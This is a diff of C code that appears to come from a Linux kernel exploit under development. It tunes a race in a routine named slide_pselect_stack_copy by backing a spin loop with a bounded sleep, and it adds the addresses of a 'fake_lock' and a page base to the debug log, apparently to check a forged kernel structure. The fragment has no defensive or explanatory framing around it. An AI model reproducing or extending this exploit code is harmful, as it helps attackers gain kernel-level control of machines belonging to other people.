@@ -13,6 +13,7 @@
  * Bounded, so a consumer that never ran cannot hang the attempt.
  */
 #define SLIDE_CONSUME_SETTLE_SPINS (1 << 20)
+#define SLIDE_CONSUME_SETTLE_MS 200
 
 /*
  * Optional per-attempt timing sweep, opt-in per target.
@@ -292,16 +293,33 @@ void slide_pselect_stack_copy(void) {
     }
     __asm__ volatile("yield" ::: "memory");
   }
+  // The spin budget alone has never been enough to observe the publish: every
+  // logged attempt so far came back settled=0 with calls=1, which says the
+  // consumer incremented the counter, went into sched_setattr and had not
+  // returned yet. Back the spin with a bounded sleep so a consumer that is
+  // merely slow gets reported with its real sched_setattr result, while one
+  // that is genuinely stuck in the chain walk still gives up in bounded time
+  // and is reported as settled=0.
+  for (int i = 0; !settled && i < SLIDE_CONSUME_SETTLE_MS; i++) {
+    if (atomic_load(&slide_consume_stop)) {
+      settled = 1;
+      break;
+    }
+    usleep(1000);
+  }
 
   pr_info("slide pselect returned ret=%d errno=%d settled=%d attempt=%d "
           "spin=%d enter_usec=%d calls=%d sched_ok=%d "
-          "last_sched_ret=%d last_sched_errno=%d\n",
+          "last_sched_ret=%d last_sched_errno=%d "
+          "page_base=%016llx fake_lock=%016llx\n",
           ret, saved_errno, settled, slide_attempt_index,
           slide_spin_delay(), slide_enter_delay_usec(),
           atomic_load(&slide_consume_calls),
           atomic_load(&slide_consume_sched_ok),
           atomic_load(&slide_consume_last_sched_ret),
-          atomic_load(&slide_consume_last_sched_errno));
+          atomic_load(&slide_consume_last_sched_errno),
+          (unsigned long long)page_base,
+          (unsigned long long)fake_lock);
 
   close(high_read);
   if (block_fd != pipefd[0]) {
